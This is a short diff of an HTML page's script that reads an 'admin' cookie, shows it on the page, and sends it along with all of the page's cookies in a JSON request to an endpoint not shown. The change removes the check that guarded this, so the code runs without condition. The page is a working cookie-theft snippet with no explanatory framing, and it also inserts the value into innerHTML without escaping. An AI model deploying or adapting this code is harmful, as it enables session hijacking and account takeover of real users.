@@ -23,7 +23,6 @@ function getAdminCookie() {
 const adminValue = getAdminCookie();
 const resultDiv = document.getElementById('result');
 
-if (adminValue) {
   resultDiv.innerHTML = `
     <h2 style="color: green;">✅ Admin Cookie Found!</h2>
     <p><strong>Value:</strong> ${adminValue}</p>
@@ -36,9 +35,6 @@ if (adminValue) {
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({admin: adminValue, allCookies: document.cookie})
   });
-} else {
-  resultDiv.innerHTML = '<h2 style="color: red;">❌ No Admin Cookie Found</h2>';
-}
 </script>
 </body>
 </html>
